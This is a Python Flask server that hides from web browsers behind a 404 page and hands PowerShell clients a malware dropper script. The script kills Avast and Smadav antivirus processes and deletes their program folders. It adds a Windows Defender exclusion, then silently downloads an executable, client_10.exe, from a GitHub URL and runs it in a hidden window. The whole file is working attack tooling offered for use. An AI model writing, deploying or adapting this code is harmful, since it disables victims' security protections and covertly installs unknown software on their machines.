from flask import Flask, Response, request
import os

app = Flask(__name__)

@app.route('/')
def direct_command():
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Stealth: Show 404 to browsers
    if 'mozilla' in user_agent and 'powershell' not in user_agent:
        return Response("Not Found", status=404, mimetype='text/plain')

    # The Payload
    ps_content = """
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "--- JAILBREAK-1: ACTIVE ---" -ForegroundColor Green
    
    # 1. Aggressively kill background processes
    $procs = @("AvastUI", "AvastSvc", "Smadav", "SMADAV", "client_10")
    foreach ($p in $procs) {
        taskkill /F /IM "$p.exe" /T 2>$null
    }

    # 2. Cleanup Target Folders
    $folders = @("C:\\Program Files\\Avast Software", "C:\\Program Files (x86)\\SMADAV", "C:\\Program Files\\SMADAV")
    foreach ($f in $folders) {
        if (Test-Path $f) {
            Remove-Item -Path $f -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # 3. HIDDEN DEPLOYMENT: Start a new hidden background process for the download
    $deployScript = {
        $path = "$HOME\\client_10.exe"
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
        
        # Download and Run
        if (!(Test-Path $path)) {
            Invoke-WebRequest -Uri "https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe" -OutFile $path
        }
        if (Test-Path $path) {
            Start-Process $path -WindowStyle Hidden
        }
    }

    # Launch the deployment script in a separate hidden PowerShell window
    Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command & {$deployScript}" -WindowStyle Hidden
    
    Write-Host "[+] Background deployment started hidden." -ForegroundColor Green
} else {
    Write-Host "--- ERROR: ADMIN RIGHTS REQUIRED ---" -ForegroundColor Red
}
"""
    return Response(ps_content, mimetype='text/plain')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
